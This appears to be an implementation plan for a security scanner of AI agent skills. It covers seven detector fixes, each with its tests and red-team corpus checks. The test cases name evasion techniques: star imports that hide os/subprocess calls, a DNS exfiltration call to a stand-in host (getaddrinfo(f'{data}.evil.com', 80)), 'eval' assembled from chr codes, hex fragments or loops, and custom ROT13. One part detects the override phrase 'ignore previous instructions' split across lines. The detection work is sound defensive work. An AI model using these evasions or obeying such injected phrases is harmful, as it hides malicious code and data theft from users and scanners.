# Skeleton opt-out: brownfield single-layer changes (7 independent fixes to existing detector modules)

parts:
  - id: a
    title: "Star imports + DNS exfil f-string"
    status: Done
    requirements_covered: [R001, R004, R-EFF001]
    approach:
      - step: "Expand star imports in build_alias_map"
        files: [src/skill_scan/_ast_helpers.py]
        notes: |
          In _record_import_from, detect when alias.name == '*'. For known-dangerous
          modules, expand to their dangerous exports. Add _STAR_IMPORT_EXPANSIONS dict:
            'os': ['system', 'popen', 'execl', 'execle', 'execlp', 'execv',
                   'execve', 'execvp', 'execvpe', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe']
            'subprocess': ['run', 'call', 'check_output', 'check_call', 'Popen']
            'shutil': ['rmtree', 'move', 'copy', 'copy2']
          For each name in the expansion, add alias_map[name] = f'{module}.{name}'.
          This is ~15 lines for the table + ~5 lines for the logic branch in
          _record_import_from. File at 268/300 -> ~288/300.
      - step: "Add AST detection for DNS exfil via getaddrinfo with non-literal arg"
        files: [src/skill_scan/_ast_exfil_detector.py]
        notes: |
          Add _detect_dns_exfil function: detect socket.getaddrinfo() where the first
          positional arg is NOT a plain string constant (covers f-strings, variables,
          concatenation). Use get_call_name with alias_map. Also handle bare
          'getaddrinfo' if 'from socket import *' expanded above.
          Emit EXFIL-006 finding with category='data-exfiltration'.
          Register in _DETECTORS tuple in ast_analyzer.py.
          File at 79/300 -> ~120/300.
      - step: "Add tests for star import expansion and DNS exfil"
        files: [tests/unit/test_ast_helpers.py, tests/unit/test_ast_exfil_detector.py]
        notes: |
          Test 'from os import *' expands system/popen/exec into alias_map.
          Test 'from subprocess import *' expands run/call/Popen.
          Test unknown module star import doesn't expand (no crash).
          Test getaddrinfo(f'{data}.evil.com', 80) produces EXFIL-006.
          Test getaddrinfo('literal.com', 80) does NOT produce finding.
          Verify corpus files produce findings.
    criteria:
      - "build_alias_map expands 'from os import *' to map system -> os.system, popen -> os.popen, etc."
      - "build_alias_map expands 'from subprocess import *' to map run -> subprocess.run, Popen -> subprocess.Popen, etc."
      - "Star import expansion only applies to modules in _STAR_IMPORT_EXPANSIONS (no unknown module expansion)"
      - "Existing explicit import resolution still works (no regression)"
      - "_detect_dns_exfil detects socket.getaddrinfo(f'{data}.evil.com', 80) as EXFIL-006"
      - "_detect_dns_exfil does NOT flag getaddrinfo('literal.example.com', 80)"
      - "_detect_dns_exfil resolves aliased socket import via alias_map"
      - "_detect_dns_exfil registered in _DETECTORS and re-exported from ast_analyzer.py"
      - "_ast_helpers.py stays under 300 lines"
      - "_ast_exfil_detector.py stays under 300 lines"
      - "Corpus star_import_evasion.py produces EXEC-002 or EXEC-003 finding"
      - "Corpus exfil_dns_txt.py produces EXFIL-006 finding"

  - id: b
    title: "Nested comprehension + hex fragment resolution"
    status: Done
    requirements_covered: [R005, R006, R-EFF001]
    approach:
      - step: "Extend _resolve_comprehension_join for multiple generators"
        files: [src/skill_scan/_ast_split_join_helpers.py]
        notes: |
          Current guard: 'if len(node.generators) != 1: return None'. Add a branch
          for exactly 2 generators matching the nested pattern:
            for row in [[ints], [ints]]  (outer: list of lists)
            for c in row                 (inner: iterates outer variable)
          When detected, flatten the 2D list to 1D and dispatch to existing
          _resolve_comprehension_chr. New function _resolve_nested_comprehension_join
          (~25 lines). File at 248/300 -> ~275/300.
      - step: "Add bytes.fromhex() resolution to _ast_split_bytes.py"
        files: [src/skill_scan/_ast_split_bytes.py]
        notes: |
          Add resolve_fromhex_concat: resolves (bytes.fromhex('XX') + bytes.fromhex('YY')).decode()
          to a decoded string. Steps:
          1. _resolve_fromhex(node) -> bytes|None: resolves bytes.fromhex('hex_str')
          2. _resolve_fromhex_binop(node) -> bytes|None: resolves BinOp(Add) of fromhex calls
          3. Wrap in decode handler: outer is .decode() call, inner is fromhex binop
          Resolve entire expression inline (no symbol_table bytes tracking —
          symbol_table is dict[str, str], cannot hold bytes). Handle only inline
          patterns: (bytes.fromhex('XX') + bytes.fromhex('YY')).decode().
          Tracked-variable fromhex is out of scope for this plan.
          File at 101/300 -> ~170/300.
      - step: "Register hex fragment resolver in split-evasion chain"
        files: [src/skill_scan/_ast_split_detector.py]
        notes: |
          Import resolve_fromhex_concat from _ast_split_bytes. Register as a
          direct check in detect_split_evasion (NOT in resolve_call chain —
          _ast_split_resolve.py is off-limits at 291/300 lines).
          File at 209/300 -> ~215/300.
      - step: "Add tests for nested comprehension and hex fragments"
        files: [tests/unit/test_ast_split_join_helpers.py, tests/unit/test_ast_split_bytes.py]
        notes: |
          Test [chr(c) for row in [[101,118],[97,108]] for c in row] resolves to 'eval'.
          Test 3 generators returns None (only 2 supported).
          Test bytes.fromhex('6576') + bytes.fromhex('616c') resolves to b'eval'.
          Test .decode() on concatenated fromhex resolves to 'eval'.
          Test non-hex string in fromhex returns None gracefully.
          Verify corpus files produce findings.
    criteria:
      - "_resolve_comprehension_join handles 2 generators with nested list-of-lists pattern"
      - "Nested comprehension [chr(c) for row in [[101,118],[97,108]] for c in row] resolves to 'eval'"
      - "Outer iter must be List of Lists (not arbitrary expressions)"
      - "Inner target must match outer target name (for c in row, where row is outer variable)"
      - "3+ generators still return None (guard only relaxed for 2)"
      - "Existing single-generator comprehension still works (no regression)"
      - "resolve_fromhex_concat resolves (bytes.fromhex('6576') + bytes.fromhex('616c')).decode() to 'eval'"
      - "Inline fromhex concat resolves without symbol table (no bytes tracking in symbol_table)"
      - "Non-hex strings in fromhex return None (no crash on invalid hex)"
      - "_ast_split_join_helpers.py stays under 300 lines"
      - "_ast_split_bytes.py stays under 300 lines"
      - "Corpus nested_comprehension.py produces EXEC-002 finding"
      - "Corpus obfs_hex_split.py produces EXEC-002 finding"

  - id: c
    title: "Multi-line PI detection"
    status: Done
    requirements_covered: [R002, R-EFF001]
    approach:
      - step: "Add cross-line PI scanning pass to rules engine"
        files: [src/skill_scan/rules/engine.py]
        notes: |
          After the per-line scan loop in _match_content_recursive, add a
          _scan_multiline_pi pass for PI-category rules. Sliding window: join
          consecutive N lines (N=3,4,5) with single space, then match against PI
          rules. Attribute findings to the first line of the window.
          Deduplicate: skip if same rule_id already found on any line in the window.
          Only apply to rules where category == 'prompt-injection' to limit scope.
          New function _multiline_pi_findings (~30 lines). File at 229/300 -> ~260/300.
      - step: "Reuse existing PI line rules for cross-line matching (Option A)"
        files: [src/skill_scan/rules/engine.py]
        notes: |
          Filter PI line_rules and reuse for cross-line matching. No new match_scope
          type (loader hard-restricts to line|file). Join lines, apply existing PI
          line rules to the joined text. No Rule model or TOML schema changes.
      - step: "Add tests for multi-line PI detection"
        files: [tests/unit/test_engine_multiline.py]
        notes: |
          Test "ignore\nprevious\ninstructions" across 3 lines triggers PI-001.
          Test "ignore previous instructions" on single line still works.
          Test non-PI rules are NOT applied in multi-line pass.
          Test 6+ line gap does NOT trigger (window size limit).
          Test deduplication: single-line match not duplicated by multi-line pass.
          Verify corpus guide.md produces PI-001 finding.
    criteria:
      - "Multi-line PI pass joins sliding windows of 3-5 consecutive lines"
      - "'ignore\\nprevious\\ninstructions' split across 3 lines triggers PI-001"
      - "Only prompt-injection category rules are applied in multi-line pass"
      - "Findings attributed to first line of matching window"
      - "Deduplication: multiline findings skip if same (rule_id, any_line_in_window) already found by single-line pass"
      - "Window size bounded (max 5 lines) to limit false positive risk"
      - "Existing single-line PI detection unchanged (no regression)"
      - "rules/engine.py stays under 300 lines"
      - "Corpus guide.md produces PI-001 finding"

  - id: d
    title: "Custom ROT13 heuristic detector"
    status: Done
    requirements_covered: [R003, R-EFF001]
    approach:
      - step: "Add _detect_custom_rot13 function in _ast_rot13.py"
        files: [src/skill_scan/_ast_rot13.py]
        notes: |
          Detect function definitions containing manual ROT13 rotation arithmetic.
          Pattern: function body contains a for-loop iterating over a string param,
          and the loop body contains chr((ord(VAR) - ord('a') + N) % 26 + ord('a'))
          or equivalent arithmetic forms.
          Key signature: % 26 in combination with chr() and ord() inside a loop.
          Conservative heuristic: require BOTH lowercase and uppercase ROT13 branches
          (the standard pattern has if 'a' <= c <= 'z' and if 'A' <= c <= 'Z').
          Emit OBFS-001 finding on the function def line.
          New function ~40 lines + helper ~20 lines. File at 165/300 -> ~225/300.
      - step: "Register as tree-level detector in analyze_python"
        files: [src/skill_scan/ast_analyzer.py]
        notes: |
          Custom ROT13 needs full function body analysis, not per-node dispatch.
          Add as a tree-level detector (like detect_split_evasion) in analyze_python.
          Walk ast.FunctionDef nodes and call _detect_custom_rot13 on each.
          File at 127/300 -> ~135/300.
      - step: "Add tests for custom ROT13 detection"
        files: [tests/unit/test_ast_rot13.py]
        notes: |
          Test custom_rot function from corpus (chr/ord with %26) triggers OBFS-001.
          Test function with chr/ord but WITHOUT %26 does NOT trigger (general chr/ord use).
          Test function with %26 but no chr/ord does NOT trigger.
          Test non-function code with ROT13 arithmetic does NOT trigger (must be in FunctionDef).
          Verify corpus obfs_rot13_custom.py produces OBFS-001 finding.
    criteria:
      - "_detect_custom_rot13 detects function with chr((ord(c) - ord('a') + N) % 26 + ord('a')) pattern"
      - "Requires both lowercase and uppercase branches for confidence"
      - "Requires the pattern to be inside a FunctionDef (not bare code)"
      - "chr/ord without %26 arithmetic does NOT trigger (avoid false positives)"
      - "Existing codecs/maketrans ROT13 detection unchanged (no regression)"
      - "_ast_rot13.py stays under 300 lines"
      - "Corpus obfs_rot13_custom.py produces OBFS-001 finding"

  - id: e
    title: "Loop assembly static unrolling"
    status: Done
    requirements_covered: [R007, R-EFF001]
    approach:
      - step: "Create _ast_loop_unroller.py with static for-loop resolution"
        files: [src/skill_scan/_ast_loop_unroller.py]
        notes: |
          New file. Detect and statically unroll limited for-loop patterns:
            target = ''
            for VAR in [str_literal, str_literal, ...]:
                target += VAR
          Resolve target to the concatenation of all list elements.

          collect_loop_assigns(tree) -> dict[str, str]: pre-pass function.
          Walk module-level and function-level bodies. For each For node:
          1. Check iter is ast.List with all string Constant elements
          2. Check body has exactly one AugAssign (target += loop_var)
          3. Look backwards for target = '' initialization
          4. If all match, resolve target = ''.join(elements)
          Store in dict keyed by scope.target_name.

          Only supports inline list literals as iter source: [str, str, ...].
          Tracked list variables from symbol_table are NOT supported (symbol_table
          is dict[str, str], cannot hold lists). May use int_list_table for
          int-list iter sources in future.

          ~60-80 lines for the module. Stays well under 300.
      - step: "Integrate loop unrolling into symbol table / split-evasion chain"
        files: [src/skill_scan/ast_analyzer.py, src/skill_scan/_ast_split_detector.py]
        notes: |
          Call collect_loop_assigns(tree) in analyze_python, merge results into
          symbol_table before detect_split_evasion runs. This way loop-assembled
          strings are available for split-evasion detection.
          ast_analyzer.py at 127/300 -> ~132/300.
          _ast_split_detector.py at 209/300 -> unchanged (uses symbol_table).
      - step: "Add tests for loop assembly unrolling"
        files: [tests/unit/test_ast_loop_unroller.py]
        notes: |
          Test for c in ['e','v','a','l']: name += c resolves name to 'eval'.
          Test for c in chars: name += c where chars is a variable (NOT inline list) returns None.
          Test loop with non-string elements returns None.
          Test loop with multiple statements in body returns None (conservative).
          Test nested loops return None (only single-level supported).
          Test loop body with if-guard returns None (conservative).
          Verify corpus loop_assembly.py produces EXEC-002 finding.
    criteria:
      - "collect_loop_assigns resolves 'for c in [str_literals]: name += c' to concatenated string"
      - "Requires target initialized to '' before the loop"
      - "Requires iter to be inline list of string constants (tracked list variables NOT supported)"
      - "Requires body to be exactly one AugAssign(target += loop_var)"
      - "Multiple body statements or if-guards cause conservative None return"
      - "Nested loops not supported (single-level only)"
      - "Results merged into symbol_table for split-evasion detection"
      - "_ast_loop_unroller.py stays under 300 lines"
      - "Corpus loop_assembly.py produces EXEC-002 finding"

  - id: f
    title: "Red-team regression verification"
    status: Done
    depends_on: [a, b, c, d, e]
    requirements_covered: [R-EFF001, R-EFF002]
    approach:
      - step: "Run full red-team corpus via run_corpus.py and capture results"
        files: []
        notes: |
          Execute corpus/red-team/2026-03-17-full/run_corpus.py and compare results
          against the baseline (40.5% evasion rate, 32 evasions / 79 inputs).
          All 7 P2 corpus inputs must now produce findings. Calculate new evasion rate.
      - step: "Verify each P2 corpus input individually"
        files: []
        notes: |
          For each of the 7 corpus files, confirm the expected rule_id fires:
          - star_import_evasion.py -> EXEC-002 or EXEC-003
          - guide.md -> PI-001
          - obfs_rot13_custom.py -> OBFS-001
          - exfil_dns_txt.py -> EXFIL-006
          - obfs_hex_split.py -> EXEC-002
          - nested_comprehension.py -> EXEC-002
          - loop_assembly.py -> EXEC-002
      - step: "Check for false positive regressions"
        files: []
        notes: |
          Run pytest on existing test suite. Confirm no new false positives in
          negative corpus (tests/fixtures/split_evasion/neg_*.py). Run make check.
          Multi-line PI and custom ROT13 are highest false-positive risk — verify
          negative cases explicitly.
      - step: "Update results.json and report findings delta"
        files: [corpus/red-team/2026-03-17-full/results.json]
        notes: |
          Regenerate results.json via run_corpus.py. Report improvement:
          old evasion count vs new, old rate vs new. Flag any collateral changes.
    criteria:
      - "All 7 P2 corpus inputs produce findings (zero evasions for P2 set)"
      - "Overall evasion rate decreased from 40.5% baseline"
      - "No new false positives in existing negative corpus"
      - "No new false positives from multi-line PI in benign markdown files"
      - "No new false positives from custom ROT13 in benign chr/ord code"
      - "make check passes (full pre-commit suite)"
      - "results.json updated with new scan results"
      - "Findings delta documented in work_log"

